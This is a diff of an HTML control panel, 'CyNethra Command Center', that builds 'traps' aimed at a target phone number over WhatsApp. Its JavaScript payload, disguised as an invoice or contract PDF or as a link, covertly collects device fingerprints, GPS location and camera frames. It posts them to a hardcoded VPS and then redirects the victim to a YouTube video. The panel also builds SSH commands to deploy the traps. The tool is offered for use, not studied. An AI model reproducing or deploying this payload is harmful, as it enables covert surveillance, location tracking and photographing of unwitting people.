@@ -6,384 +6,346 @@
     <title>CyNethra Command Center</title>
     <style>
         :root {
-            --bg-main: #0a0a0a;
-            --bg-card: #111827;
-            --bg-input: #1f2937;
-            --accent: #10b981;
-            --accent-hover: #059669;
-            --text-main: #f3f4f6;
-            --text-muted: #9ca3af;
-            --border: #374151;
+            --bg-dark: #0f172a;
+            --bg-card: #1e293b;
+            --accent: #38bdf8;
+            --accent-hover: #0ea5e9;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --success: #10b981;
             --error: #ef4444;
-            --warning: #f59e0b;
+            --border: #334155;
         }
-
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: var(--bg-main);
+            background-color: var(--bg-dark);
             color: var(--text-main);
-            line-height: 1.6;
             padding: 20px;
         }
-
-        .container { max-width: 1200px; margin: 0 auto; }
-        
+        .container { max-width: 1400px; margin: 0 auto; }
         header {
-            text-align: center;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
             margin-bottom: 30px;
             padding-bottom: 20px;
-            border-bottom: 2px solid var(--accent);
+            border-bottom: 1px solid var(--border);
         }
-        header h1 {
-            font-size: 2.5rem;
-            color: var(--accent);
-            letter-spacing: 2px;
-            text-transform: uppercase;
+        h1 { font-size: 24px; color: var(--accent); font-weight: 600; }
+        .status-badge {
+            padding: 5px 15px;
+            background-color: var(--bg-card);
+            border-radius: 20px;
+            font-size: 14px;
+            border: 1px solid var(--border);
         }
-        header p { color: var(--text-muted); margin-top: 5px; }
-
         .grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 20px;
         }
         @media (max-width: 900px) { .grid { grid-template-columns: 1fr; } }
-
         .card {
             background-color: var(--bg-card);
             border-radius: 8px;
             padding: 20px;
             border: 1px solid var(--border);
-            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+            margin-bottom: 20px;
         }
-
         .card h2 {
-            font-size: 1.2rem;
-            color: var(--accent);
+            font-size: 18px;
             margin-bottom: 15px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
+            color: var(--accent);
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 10px;
         }
-
         .form-group { margin-bottom: 15px; }
-        label {
-            display: block;
-            margin-bottom: 5px;
-            font-size: 0.9rem;
-            color: var(--text-muted);
-            font-weight: 600;
-        }
+        label { display: block; margin-bottom: 5px; font-size: 14px; color: var(--text-muted); }
         input, select, textarea {
             width: 100%;
             padding: 10px;
-            background-color: var(--bg-input);
+            background-color: var(--bg-dark);
             border: 1px solid var(--border);
             color: var(--text-main);
             border-radius: 4px;
-            font-size: 0.95rem;
+            font-family: monospace;
         }
-        input:focus, select:focus {
-            outline: none;
-            border-color: var(--accent);
-        }
-
         button {
             background-color: var(--accent);
-            color: white;
+            color: var(--bg-dark);
             border: none;
-            padding: 12px 20px;
+            padding: 10px 20px;
             border-radius: 4px;
             font-weight: bold;
             cursor: pointer;
+            transition: background 0.3s;
             width: 100%;
             margin-top: 10px;
-            transition: background 0.3s;
-            font-size: 1rem;
         }
         button:hover { background-color: var(--accent-hover); }
-        button.secondary {
-            background-color: transparent;
-            border: 1px solid var(--border);
-            color: var(--text-muted);
-        }
-        button.secondary:hover { background-color: var(--bg-input); }
-
+        button.secondary { background-color: var(--text-muted); }
         .output-area {
             background-color: #000;
             color: #0f0;
-            font-family: 'Courier New', Courier, monospace;
-            font-size: 0.85rem;
+            font-family: monospace;
+            font-size: 12px;
             height: 200px;
             overflow-y: auto;
             padding: 10px;
             border-radius: 4px;
             border: 1px solid var(--border);
             white-space: pre-wrap;
-            word-break: break-all;
             margin-top: 10px;
         }
-
-        .step {
-            background-color: var(--bg-input);
-            padding: 10px;
-            border-radius: 4px;
-            margin-bottom: 10px;
-            font-family: monospace;
-            font-size: 0.9rem;
-            position: relative;
-        }
-        .step::before {
-            content: attr(data-step);
-            position: absolute;
-            top: 10px;
-            right: 10px;
-            background-color: var(--accent);
-            color: white;
-            padding: 2px 8px;
-            border-radius: 4px;
-            font-size: 0.75rem;
-        }
-
         .badge {
             display: inline-block;
-            padding: 4px 8px;
-            background-color: var(--accent);
-            color: white;
+            padding: 2px 8px;
             border-radius: 4px;
-            font-size: 0.8rem;
-            font-weight: bold;
+            font-size: 12px;
         }
-
-        .tabs {
-            display: flex;
-            gap: 5px;
-            margin-bottom: 15px;
-        }
-        .tab-btn {
-            flex: 1;
-            padding: 10px;
-            background-color: var(--bg-input);
-            border: 1px solid var(--border);
-            color: var(--text-muted);
-            cursor: pointer;
-            border-radius: 4px 4px 0 0;
-        }
-        .tab-btn.active {
-            background-color: var(--bg-card);
-            color: var(--accent);
-            border-bottom-color: var(--bg-card);
-        }
-
-        .tab-content { display: none; }
-        .tab-content.active { display: block; }
-
-        .copy-btn {
-            position: absolute;
-            top: 10px;
-            right: 10px;
-            background-color: var(--border);
-            color: white;
-            border: none;
-            padding: 5px 10px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 0.75rem;
-        }
-        .copy-btn:hover { background-color: var(--accent); }
+        .badge-success { background-color: var(--success); color: white; }
+        .badge-warning { background-color: #f59e0b; color: white; }
+        .flex-row { display: flex; gap: 10px; }
+        .flex-row > * { flex: 1; }
     </style>
 </head>
 <body>
+    <div class="container">
+        <header>
+            <h1>🕸️ CyNethra Command Center</h1>
+            <div class="status-badge" id="vps-status">VPS: 5.189.130.88</div>
+        </header>
 
-<div class="container">
-    <header>
-        <h1>🕸️ CyNethra Command Center</h1>
-        <p>Advanced Multi-Vector Intelligence Collection Framework</p>
-    </header>
+        <div class="grid">
+            <!-- Left Column: Trap Configuration -->
+            <div>
+                <div class="card">
+                    <h2>🎯 Create Intelligence Trap</h2>
+                    <div class="form-group">
+                        <label>Target Number</label>
+                        <input type="text" id="target-num" placeholder="917997187999" value="917997187999">
+                    </div>
+                    <div class="form-group">
+                        <label>Delivery Method</label>
+                        <select id="delivery-method">
+                            <option value="pdf">PDF Document (Embedded JS)</option>
+                            <option value="url">Web Link (Dynamic HTML)</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label>Redirect URL (Post-Collection)</label>
+                        <input type="text" id="redirect-url" placeholder="https://youtube.com/shorts/..." value="https://youtube.com/shorts/miJC9CeDyp0">
+                    </div>
+                    <div class="form-group">
+                        <label>Document Type (For PDF)</label>
+                        <select id="pdf-type">
+                            <option value="invoice">Invoice</option>
+                            <option value="report">Business Report</option>
+                            <option value="contract">Contract</option>
+                        </select>
+                    </div>
+                    <button onclick="generateTrap()">Generate Trap & Payload</button>
+                </div>
 
-    <div class="grid">
-        <!-- LEFT COLUMN: CONTROLS -->
-        <div>
-            <div class="card">
-                <h2>⚙️ Trap Configuration</h2>
-                <div class="form-group">
-                    <label>Target Phone Number</label>
-                    <input type="text" id="targetNum" placeholder="917997187999" value="917997187999">
+                <div class="card">
+                    <h2>🚀 Deployment Command</h2>
+                    <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 10px;">Copy this command to your terminal to deploy the trap to your VPS.</p>
+                    <div class="output-area" id="deploy-cmd" style="height: 150px;">Waiting for trap generation...</div>
+                    <button class="secondary" onclick="copyDeployCmd()">Copy Command</button>
                 </div>
-                <div class="form-group">
-                    <label>Delivery Method</label>
-                    <select id="deliveryMethod">
-                        <option value="pdf">📄 PDF Document (Invoice/Report)</option>
-                        <option value="url">🔗 Web Link (URL)</option>
-                    </select>
-                </div>
-                <div class="form-group">
-                    <label>Redirect URL (Post-Capture)</label>
-                    <input type="text" id="redirectUrl" placeholder="https://youtube.com/shorts/..." value="https://youtube.com/shorts/miJC9CeDyp0">
-                </div>
-                <div class="form-group">
-                    <label>PDF Template (if PDF selected)</label>
-                    <select id="pdfTemplate">
-                        <option value="invoice">💰 Invoice</option>
-                        <option value="report">📊 Quarterly Report</option>
-                        <option value="contract">📝 Service Agreement</option>
-                    </select>
-                </div>
-                <div class="form-group">
-                    <label>Session ID (Auto-generated if empty)</label>
-                    <input type="text" id="sessionId" placeholder="audit_01">
-                </div>
-                <button onclick="generateTrap()">🚀 Generate Trap Payload</button>
             </div>
 
-            <div class="card" style="margin-top: 20px;">
-                <h2>📦 Deployment Kit</h2>
-                <p style="font-size: 0.9rem; color: var(--text-muted); margin-bottom: 10px;">
-                    Copy these commands to your local terminal to deploy the latest code to your VPS.
-                </p>
-                <div class="step" data-step="1">
-                    <button class="copy-btn" onclick="copyText(this, 'scp -r C:\\Users\\seeka\\Desktop\\CyNethra\\scripts root@5.189.130.88:/root/CyNethra/scripts')">Copy</button>
-                    <code>scp -r C:\Users\seeka\Desktop\CyNethra\scripts root@5.189.130.88:/root/CyNethra/scripts</code>
-                </div>
-                <div class="step" data-step="2">
-                    <button class="copy-btn" onclick="copyText(this, 'ssh root@5.189.130.88 "systemctl restart cynethra.service && systemctl status cynethra.service --no-pager -l"')">Copy</button>
-                    <code>ssh root@5.189.130.88 "systemctl restart cynethra.service && systemctl status cynethra.service --no-pager -l"</code>
-                </div>
-            </div>
-        </div>
-
-        <!-- RIGHT COLUMN: OUTPUT -->
-        <div>
-            <div class="card">
-                <div class="tabs">
-                    <div class="tab-btn active" onclick="switchTab('trap')">Trap Details</div>
-                    <div class="tab-btn" onclick="switchTab('js')">JS Payload</div>
-                    <div class="tab-btn" onclick="switchTab('deploy')">Deploy Script</div>
+            <!-- Right Column: Payload Preview & Logs -->
+            <div>
+                <div class="card">
+                    <h2>📄 JavaScript Payload Preview</h2>
+                    <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 10px;">This is the code that will run on the target's device.</p>
+                    <div class="output-area" id="js-payload" style="height: 300px;">// JS Payload will appear here</div>
                 </div>
 
-                <!-- Tab 1: Trap Details -->
-                <div id="tab-trap" class="tab-content active">
-                    <div class="form-group">
-                        <label>Generated Trap URL</label>
-                        <div class="step" data-step="URL" style="background-color: #000; color: #0f0;">
-                            <button class="copy-btn" onclick="copyText(this, document.getElementById('trapUrlOutput').textContent)">Copy</button>
-                            <code id="trapUrlOutput">Waiting for generation...</code>
-                        </div>
+                <div class="card">
+                    <h2>📊 Collection Summary</h2>
+                    <div id="summary-grid" style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
+                        <div class="card" style="margin: 0; padding: 10px;"><strong>📍 Location</strong><br><span class="badge badge-success">GPS + IP Fallback</span></div>
+                        <div class="card" style="margin: 0; padding: 10px;"><strong>📸 Media</strong><br><span class="badge badge-success">Front/Back Burst</span></div>
+                        <div class="card" style="margin: 0; padding: 10px;"><strong>🔍 Fingerprint</strong><br><span class="badge badge-success">Canvas/WebGL</span></div>
+                        <div class="card" style="margin: 0; padding: 10px;"><strong>📂 Files</strong><br><span class="badge badge-warning">Enumeration</span></div>
                     </div>
-                    <div class="form-group">
-                        <label>Session ID</label>
-                        <input type="text" id="sessionOutput" readonly>
-                    </div>
-                    <div class="form-group">
-                        <label>Delivery Type</label>
-                        <input type="text" id="deliveryOutput" readonly>
-                    </div>
-                    <div class="form-group">
-                        <label>Target</label>
-                        <input type="text" id="targetOutput" readonly>
-                    </div>
-                    <button class="secondary" onclick="downloadPayload()">💾 Download Payload JSON</button>
-                </div>
-
-                <!-- Tab 2: JS Payload -->
-                <div id="tab-js" class="tab-content">
-                    <p style="font-size: 0.9rem; color: var(--text-muted); margin-bottom: 10px;">
-                        This is the JavaScript code embedded in the PDF/URL. It collects device, location, and media data.
-                    </p>
-                    <div class="output-area" id="jsPayloadOutput">Click "Generate Trap Payload" to see the JS code...</div>
-                    <button onclick="copyText(document.getElementById('jsPayloadOutput').textContent, null)">📋 Copy Full JS Payload</button>
-                </div>
-
-                <!-- Tab 3: Deploy Script -->
-                <div id="tab-deploy" class="tab-content">
-                    <p style="font-size: 0.9rem; color: var(--text-muted); margin-bottom: 10px;">
-                        Save this as <code>cynethra_honeytrap.py</code> in your <code>/scripts</code> folder.
-                    </p>
-                    <div class="output-area" id="deployScriptOutput">Click "Generate Trap Payload" to see the Python code...</div>
-                    <button onclick="downloadPython()">💾 Download cynethra_honeytrap.py</button>
                 </div>
             </div>
         </div>
     </div>
-</div>
 
-<script>
-let currentPayload = null;
+    <script>
+        // ==============================================================================
+        // CORE LOGIC: GENERATE PAYLOAD
+        // ==============================================================================
+        function generateTrap() {
+            const target = document.getElementById('target-num').value;
+            const delivery = document.getElementById('delivery-method').value;
+            const redirectUrl = document.getElementById('redirect-url').value;
+            const pdfType = document.getElementById('pdf-type').value;
+            const trapId = 'trap_' + Date.now().toString(36);
+            const sessionId = 'auto';
+            const vpsUrl = 'http://5.189.130.88:5000'; // Your VPS URL
 
-function switchTab(tabId) {
-    // Hide all tabs
-    document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
-    document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
-    
-    // Show selected tab
-    document.getElementById(`tab-${tabId}`).classList.add('active');
-    event.target.classList.add('active');
-}
+            // 1. Build the JavaScript Payload
+            const jsPayload = buildJsPayload(trapId, sessionId, redirectUrl, vpsUrl);
+            
+            // 2. Display Payload
+            document.getElementById('js-payload').textContent = jsPayload;
 
-function copyText(text, btn) {
-    navigator.clipboard.writeText(text).then(() => {
-        if (btn) {
-            const originalText = btn.textContent;
-            btn.textContent = 'Copied!';
-            btn.style.backgroundColor = '#10b981';
-            setTimeout(() => {
-                btn.textContent = originalText;
-                btn.style.backgroundColor = '';
-            }, 2000);
+            // 3. Build the Deployment Command
+            let deployCmd;
+            if (delivery === 'pdf') {
+                // For PDF, we need to generate the PDF on the VPS using the Python script
+                const pyCode = `
+import sys, json
+sys.path.append("scripts")
+import cynethra_honeytrap as h
+import cynethra_pdf_forge as pdf_forge
+
+config = h.get_advanced_config("${target}", "whatsapp", "${sessionId}", "${redirectUrl}", "pdf")
+config["pdf_specific"]["type"] = "${pdfType}"
+
+# Generate JS Payload
+js = h.generate_js_payload(config, "${trapId}", "${sessionId}", "${redirectUrl}", "${vpsUrl}", "pdf")
+
+# Create PDF
+pdf_result = pdf_forge.create_pdf_trap("${trapId}", config, js, "${pdfType}")
+
+print(json.dumps({"trap_url": "${vpsUrl}${pdf_result['pdf_url']}", "pdf_path": pdf_result['pdf_path']}))
+`;
+                deployCmd = `ssh root@5.189.130.88 "cd /root/CyNethra && venv/bin/python -c '${pyCode.replace(/\n/g, ' ').replace(/'/g, "\\'")}'"`;
+            } else {
+                // For URL, we just save the trap config
+                const pyCode = `
+import sys, json
+sys.path.append("scripts")
+import cynethra_honeytrap as h
+
+config = h.get_advanced_config("${target}", "whatsapp", "${sessionId}", "${redirectUrl}", "url")
+res = h.create_trap("${target}", "whatsapp", "${sessionId}", target_url="${redirectUrl}", config=config, delivery="url")
+print(json.dumps(res))
+`;
+                deployCmd = `ssh root@5.189.130.88 "cd /root/CyNethra && venv/bin/python -c '${pyCode.replace(/\n/g, ' ').replace(/'/g, "\\'")}'"`;
+            }
+
+            document.getElementById('deploy-cmd').textContent = deployCmd;
+            
+            // Update Status
+            document.getElementById('vps-status').innerHTML = `Trap ID: <span class="badge badge-success">${trapId}</span>`;
         }
-    });
-}
 
-function generateTrap() {
-    const target = document.getElementById('targetNum').value;
-    const delivery = document.getElementById('deliveryMethod').value;
-    const redirectUrl = document.getElementById('redirectUrl').value;
-    const pdfTemplate = document.getElementById('pdfTemplate').value;
-    let sessionId = document.getElementById('sessionId').value || `auto_${Date.now()}`;
-
-    // 1. Generate Unique Trap ID
-    const trapId = Math.random().toString(36).substring(2, 15);
-    const baseDomain = "5.189.130.88:5000"; // Your VPS IP:Port
-    const trapUrl = `http://${baseDomain}/${delivery === 'pdf' ? 'pdf' : 't'}/${trapId}${delivery === 'pdf' ? '.pdf' : ''}`;
-
-    // 2. Build Config
-    const config = {
-        target: target,
-        channel: "whatsapp",
-        session_id: sessionId,
-        target_url: redirectUrl,
-        delivery: delivery,
-        pdf_template: pdfTemplate,
-        fingerprinting: {
-            canvas: true, webgl: true, audio: true, fonts: true,
-            timezone: true, locale: true, screen: true, hardware: true,
-            battery: true, network: true, storage: true, media: true,
-            file_system: true, user_agent: true, webdriver: true
-        },
-        location: {
-            enable: true, high_accuracy: true, ip_fallback: true,
-            watch_position: false, timeout: 10000
-        },
-        behavioral: {
-            mouse_tracking: true, scroll_tracking: true, click_heatmap: true,
-            time_on_page: true, tab_focus: true, pdf_interactions: true
-        },
-        network_intel: {
-            dns_leak: true, cdn_detection: true, ip_details: true, proxy_detection: true
-        },
-        media_capture: {
-            enable: true, devices: ["user", "environment"],
-            resolution: { width: 1280, height: 720 }, frame_rate: 30,
-            capture_mode: "burst", burst_count: 10, save_webm: true
-        }
+        // ==============================================================================
+        // JS PAYLOAD BUILDER
+        // ==============================================================================
+        function buildJsPayload(trapId, sessionId, targetUrl, baseUrl) {
+            return `(function() {
+    const CONFIG = {
+        trap_id: '${trapId}',
+        session_id: '${sessionId}',
+        target_url: '${targetUrl}',
+        base_url: '${baseUrl}',
+        location: { enable: true, high_accuracy: true },
+        media: { devices: ['user', 'environment'], burst_count: 10 }
     };
+    
+    const data = {
+        trap_id: CONFIG.trap_id,
+        timestamp: new Date().toISOString(),
+        device: {},
+        location: null,
+        media: { frames: [], cameras: [] },
+        behavioral: {}
+    };
+    
+    // 1. Fingerprint
+    data.device = {
+        ua: navigator.userAgent,
+        platform: navigator.platform,
+        cpu: navigator.hardwareConcurrency,
+        ram: navigator.deviceMemory,
+        screen: { w: screen.width, h: screen.height },
+        battery: null
+    };
+    
+    if (navigator.getBattery) {
+        navigator.getBattery().then(b => data.device.battery = { level: b.level, charging: b.charging });
+    }
+    
+    // 2. Location
+    navigator.geolocation.getCurrentPosition(pos => {
+        data.location = {
+            lat: pos.coords.latitude,
+            lng: pos.coords.longitude,
+            acc: pos.coords.accuracy
+        };
+        sendData();
+    }, () => {
+        data.location = { error: 'denied' };
+        sendData();
+    }, { enableHighAccuracy: true, timeout: 10000 });
+    
+    // 3. Media Capture
+    async function captureMedia() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'environment', width: 1280, height: 720 }
+            });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+            
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            
+            for (let i = 0; i < 5; i++) {
+                ctx.drawImage(video, 0, 0);
+                data.media.frames.push(canvas.toDataURL('image/jpeg', 0.7));
+                await new Promise(r => setTimeout(r, 200));
+            }
+            stream.getTracks().forEach(t => t.stop());
+            sendData();
+        } catch (e) {
+            console.warn('Media denied', e);
+            sendData();
+        }
+    }
+    
+    // 4. Send Data
+    function sendData() {
+        fetch(\`\${CONFIG.base_url}/api/collect?trap_id=\${CONFIG.trap_id}\`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        }).then(() => {
+            if (CONFIG.target_url) window.location.replace(CONFIG.target_url);
+        }).catch(() => {
+            if (CONFIG.target_url) window.location.replace(CONFIG.target_url);
+        });
+    }
+    
+    // Start
+    captureMedia();
+})();`;
+        }
 
-    // 3. Generate JS Payload
-    const jsPayload = generateJSPayload(config, trapId, sessionId, baseDomain);
-
-    // 4. Generate Python Script
-    const pythonScript = generatePythonScript(config, jsPayload);
-
-    // 5. Update UI
-    document.getElementById('trap
+        // ==============================================================================
+        // HELPERS
+        // ==============================================================================
+        function copyDeployCmd() {
+            const text = document.getElementById('deploy-cmd').textContent;
+            navigator.clipboard.writeText(text).then(() => {
+                alert('Command copied to clipboard!');
+            });
+        }
+        
+        // Auto-generate on load
+        window.onload = generateTrap;
+    </script>
+</body>
+</html>
